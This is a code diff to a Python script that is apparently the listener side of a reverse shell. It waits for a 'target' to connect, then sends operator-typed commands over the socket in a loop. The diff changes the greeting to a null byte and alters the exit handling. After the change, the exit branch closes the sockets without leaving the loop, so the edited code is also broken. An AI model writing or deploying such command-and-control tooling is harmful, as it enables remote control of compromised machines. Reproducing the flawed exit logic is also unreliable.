@@ -4,7 +4,8 @@ import sys
 
 ''' Locally bind a socket to port so it can receive data '''
 def handle_sock(port):
-    s = socket.socket()
+    #s = socket.socket()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     serv_host = '0.0.0.0'
     try:
         s.bind((serv_host, port))
@@ -12,23 +13,25 @@ def handle_sock(port):
     except socket.error as msg:
         sys.exit("Error: {}\nBind failed. You pagan...".format(msg))
     
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    #s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     listen_conns = s.listen(1)
     print("Socket is listening... on port {}".format(port))
     conn, addr = s.accept()
-    test = "Get this??".encode()
+    print("Connected to target: {}".format(addr[0]))
+    #test = "Get this??".encode()
+    test = "\x00".encode()
     conn.send(test)
     while True:
         # This opens the socket up for taking in connections
         # conn is the actual socket, addr is used for addressing purposes
         #conn, addr = s.accept()
-        print("Connected to target: {}".format(addr[0]))
         # Command handler 
-        command = input("$")
+        command = input("$ ")
         # Sending input over the wire which means string values are a no-no
         conn.send(command.encode())
         if command.lower() == "exit":
-            break
+            conn.close()
+            s.close()
 
         # Add the cd functionality
         # Receive command results here:
@@ -44,7 +47,7 @@ def main():
         port = int(sys.argv[1])
         handle_sock(port)
     except KeyboardInterrupt:
-        sys.exit("Exiting...")
+        sys.exit("\nExiting...")
 
     #client_socket, client_address = s.accept()
     
